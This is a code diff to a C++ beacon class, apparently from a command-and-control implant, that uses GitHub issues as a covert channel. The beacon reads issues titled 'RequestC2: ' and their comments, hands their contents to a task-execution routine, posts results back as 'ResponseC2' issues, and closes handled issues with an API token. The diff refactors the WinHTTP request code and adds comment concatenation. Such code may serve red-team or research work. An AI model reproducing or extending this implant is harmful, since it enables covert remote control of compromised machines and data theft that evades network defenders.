@@ -34,7 +34,7 @@ std::wstring getUtf16(const std::string& str, int codepage)
 }
 
 
-int BeaconGithub::GithubPost(const string& domain, const string& url, const string& data)
+int BeaconGithub::GithubPost(const string& domain, const string& url, const string& data, string &response)
 {
     bool isHttps = true;
     wstring sdomain = getUtf16(domain, CP_UTF8);
@@ -86,15 +86,8 @@ int BeaconGithub::GithubPost(const string& domain, const string& url, const stri
     }
 
     // Post data
-    std::string reponseTitle = "ResponseC2: ";   
-    reponseTitle+=m_beaconHash;
-    json responseData = {{"title", reponseTitle}, {"body", data}};
-    std::string finalBody = responseData.dump();
-
-    std::cout << "finalBody " << finalBody << std::endl;
-
-    LPSTR pdata = const_cast<char*>(finalBody.c_str());;
-    DWORD lenData = finalBody.size();
+    LPSTR pdata = const_cast<char*>(data.c_str());;
+    DWORD lenData = data.size();
 
     // Send a request.
     if (hRequest)
@@ -113,7 +106,7 @@ int BeaconGithub::GithubPost(const string& domain, const string& url, const stri
     WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
 
     // Keep checking for data until there is nothing left.
-    string response;
+    response.clear();
     if (bResults)
     {
         do
@@ -154,8 +147,8 @@ int BeaconGithub::GithubPost(const string& domain, const string& url, const stri
         } while (dwSize > 0);
     }
 
-    std::cout << "dwStatusCode " << std::to_string(dwStatusCode) << std::endl;
-    std::cout << "response " << response << std::endl;
+    // std::cout << "dwStatusCode " << std::to_string(dwStatusCode) << std::endl;
+    // std::cout << "response " << response << std::endl;
 
     // Close any open handles.
     if (hRequest) 
@@ -165,11 +158,11 @@ int BeaconGithub::GithubPost(const string& domain, const string& url, const stri
     if (hSession) 
         WinHttpCloseHandle(hSession);
 
-    return 0;
+    return dwStatusCode;
 }
 
 
-int BeaconGithub::GithubGet(const string& domain, const string& url)
+int BeaconGithub::GithubGet(const string& domain, const string& url, string& response)
 {
     bool isHttps = true;
     wstring sdomain = getUtf16(domain, CP_UTF8);
@@ -237,7 +230,7 @@ int BeaconGithub::GithubGet(const string& domain, const string& url)
     WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);
 
     // Keep checking for data until there is nothing left.
-    string response;
+    response.clear();
     if (bResults)
     {
         do
@@ -281,26 +274,59 @@ int BeaconGithub::GithubGet(const string& domain, const string& url)
     // Report any errors.
     if (!bResults)
         printf("Error %d has occurred.\n", GetLastError());
-        
-    
-    std::cout << "dwStatusCode " << std::to_string(dwStatusCode) << std::endl;
-    std::cout << "response " << response << std::endl;
 
-    if(!response.empty() && dwStatusCode==200)
+    return dwStatusCode;
+}
+
+
+int BeaconGithub::HandleRequest(const string& domain, const string& url)
+{
+    string response;
+    int statusCode = GithubGet(domain, url, response);
+    
+    std::cout << "statusCode " << std::to_string(statusCode) << std::endl;
+    std::cout << "response " << response.size() << std::endl;
+
+    if(!response.empty() && (statusCode==200 || statusCode==201))
     {
-        json my_json = json::parse(response);
+        json jsonIssues = json::parse(response);
 
         // for every issue in the list
-        for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
-        {
-            std::string json_str = (*it).dump();
-            auto issue = json::parse(json_str);
-            
-            std::string title = issue["title"];
-            std::string body = issue["body"];
+        for (json::iterator it = jsonIssues.begin(); it != jsonIssues.end(); ++it)
+        {            
+            std::string title = (*it)["title"];
+            std::string body = (*it)["body"];
+            int nbComments = (*it)["comments"];
+            int number = (*it)["number"];
 
             std::cout << "title " << title << std::endl;
-            std::cout << "body " << body << std::endl;
+            std::cout << "body " << body.size() << std::endl;
+            std::cout << "nbComments " << nbComments << std::endl;
+
+            if(nbComments!=0)
+            {
+                std::string issueEndpoint = "/repos/";
+                issueEndpoint += m_project;	
+                issueEndpoint += "/issues/";
+                issueEndpoint += std::to_string(number);	
+                issueEndpoint += "/comments";
+
+                statusCode = GithubGet(domain, issueEndpoint, response);
+
+                std::cout << "comments statusCode " << std::to_string(statusCode) << std::endl;
+                std::cout << "comments response " << response.size() << std::endl;
+
+                json jsonComments = json::parse(response);
+
+                for (json::iterator itc = jsonComments.begin(); itc != jsonComments.end(); ++itc)
+                {                   
+                    std::string bodyComments = (*itc)["body"];
+                    body+=bodyComments;
+
+                    std::cout << "bodyComments " << bodyComments.size() << std::endl;
+                    std::cout << "concate " << body.size() << std::endl;
+                }
+            }
 
             if(title.rfind("RequestC2: ", 0) == 0)
             {
@@ -318,67 +344,24 @@ int BeaconGithub::GithubGet(const string& domain, const string& url)
                     continue;
                 }
 
+                std::cout << "cmdToTasks body " << body.size() << std::endl;
+
                 cmdToTasks(body);
 
                 // close the issue
-                std::string number = issue["number"];
                 std::string issueEndpoint = "/repos/";
                 issueEndpoint += m_project;	
                 issueEndpoint += "/issues/";
-                issueEndpoint += number;	
-
-                 wstring surl = getUtf16(issueEndpoint, CP_UTF8);
-                if (hConnect)
-                    hRequest = WinHttpOpenRequest(hConnect, L"POST", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
-
-                // Add a request header.
-                if( hRequest )
-                {
-                    std::string auth = "token ";
-                    auth+=m_token;
-
-                    json httpHeaders = {
-                        { "Accept", "application/vnd.github+json" },
-                        { "Authorization", auth },
-                        { "Cookie", "logged_in=no" }
-                        };
-
-                    for (auto& it : httpHeaders.items())
-                    {
-                        std::string newHeader = (it).key();
-                        newHeader+=":";
-                        newHeader+=(it).value();
-
-                        std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());
-
-                        bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
-                    }
-                }
+                issueEndpoint += std::to_string(number);	
 
                 // Post data
                 json responseData = {{"state", "closed"}};
                 std::string finalBody = responseData.dump();
 
-                std::cout << "finalBody " << finalBody << std::endl;
-
-                LPSTR pdata = const_cast<char*>(finalBody.c_str());;
-                DWORD lenData = finalBody.size();
-
-                // Send a request.
-                if (hRequest)
-                    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pdata, lenData, lenData, 0);
-                
+                GithubPost(domain, issueEndpoint, finalBody, response);
             }
         }
     }
-
-    // Close any open handles.
-    if (hRequest) 
-        WinHttpCloseHandle(hRequest);
-    if (hConnect) 
-        WinHttpCloseHandle(hConnect);
-    if (hSession) 
-        WinHttpCloseHandle(hSession);
 
     return 0;
 }
@@ -407,80 +390,81 @@ void BeaconGithub::checkIn()
     
 #ifdef __linux__
 
-    std::string url = "https://api.github.com";
+    // TODO
+    // std::string url = "https://api.github.com";
 
-    std::string token = "token ";
-    token+=m_token;
+    // std::string token = "token ";
+    // token+=m_token;
 
-    httplib::Headers headers = {
-        { "Accept", "application/vnd.github+json" },
-        { "Authorization", token },
-        { "Cookie", "logged_in=no" }
-    };
+    // httplib::Headers headers = {
+    //     { "Accept", "application/vnd.github+json" },
+    //     { "Authorization", token },
+    //     { "Cookie", "logged_in=no" }
+    // };
 
-    httplib::Client cli(url);
+    // httplib::Client cli(url);
 
-    std::string endpoint = "/repos/";
-    endpoint += m_project;	
-    endpoint += "/issues";	
+    // std::string endpoint = "/repos/";
+    // endpoint += m_project;	
+    // endpoint += "/issues";	
 
-    std::cout << "endpoint " << endpoint << std::endl;
+    // std::cout << "endpoint " << endpoint << std::endl;
 
-    // Post response
-    std::string output;
-    taskResultsToCmd(output);
+    // // Post response
+    // std::string output;
+    // taskResultsToCmd(output);
 
-    if(!output.empty())
-    {
-        json responseData = {
-            {"title", "ResponseC2: test"},
-            {"body", output},
-            };
+    // if(!output.empty())
+    // {
+    //     json responseData = {
+    //         {"title", "ResponseC2: test"},
+    //         {"body", output},
+    //         };
 
-        std::string data = responseData.dump();
-        std::string contentType = "application/json";
-        auto response = cli.Post(endpoint, headers, data, contentType);
-    }
+    //     std::string data = responseData.dump();
+    //     std::string contentType = "application/json";
+    //     auto response = cli.Post(endpoint, headers, data, contentType);
+    // }
 
-    // Handle request
-    auto response = cli.Get(endpoint, headers);
+    // // Handle request
+    // auto response = cli.Get(endpoint, headers);
 
-    response->status;
-    response->body;
-    std::cout << "response->body " << response->body << std::endl;
+    // response->status;
+    // response->body;
+    // std::cout << "response->body " << response->body << std::endl;
 
-    if(!response->body.empty())
-    {
-        json my_json = json::parse(response->body);
+    // if(!response->body.empty())
+    // {
+    //     json my_json = json::parse(response->body);
 
-        // for every issue in the list
-        for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
-        {
-            std::string json_str = (*it).dump();
-            auto issue = json::parse(json_str);
+    //     // for every issue in the list
+    //     for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
+    //     {
+    //         std::string json_str = (*it).dump();
+    //         auto issue = json::parse(json_str);
             
-            std::string title = issue["title"];
-            std::string body = issue["body"];
+    //         std::string title = issue["title"];
+    //         std::string body = issue["body"];
 
-            std::cout << "title " << title << std::endl;
-            std::cout << "body " << body << std::endl;
+    //         std::cout << "title " << title << std::endl;
+    //         std::cout << "body " << body << std::endl;
 
-            if(title.rfind("RequestC2: ", 0) == 0)
-            {
-                if(!body.empty())
-                {
-                    cmdToTasks(body);
-                }
+    //         if(title.rfind("RequestC2: ", 0) == 0)
+    //         {
+    //             if(!body.empty())
+    //             {
+    //                 cmdToTasks(body);
+    //             }
 
-                std::string number = issue["number"];
-                std::string issueEndpoint = "/repos/";
-                issueEndpoint += m_project;	
-                issueEndpoint += "/issues/";
-                issueEndpoint += number;	
-                // auto response = cli.Post(issueEndpoint, headers, data, contentType);
-            }
-        }
-    }	
+    //             std::string number = issue["number"];
+    //             std::string issueEndpoint = "/repos/";
+    //             issueEndpoint += m_project;	
+    //             issueEndpoint += "/issues/";
+    //             issueEndpoint += number;	
+    //             // auto response = cli.Post(issueEndpoint, headers, data, contentType);
+    //         }
+    //     }
+    // }	
 
 
 #elif _WIN32
@@ -496,13 +480,21 @@ void BeaconGithub::checkIn()
 	std::string output;
 	taskResultsToCmd(output);
 
+    // Sent response
+    // TODO handle big response with multiple comments
+    std::string reponseTitle = "ResponseC2: ";   
+    reponseTitle+=m_beaconHash;
+    json responseData = {{"title", reponseTitle}, {"body", output}};
+    std::string finalBody = responseData.dump();
+    string response;
     std::cout << "GithubPost "  << std::endl;
 
-    GithubPost(url, endPoint, output);
+    GithubPost(url, endPoint, finalBody, response);
 
-    std::cout << "GithubGet "  << std::endl;
+    // Handle Request
+    std::cout << "HandleRequest "  << std::endl;
 
-    GithubGet(url, endPoint);
+    HandleRequest(url, endPoint);
 
     std::cout << "end "  << std::endl;
 
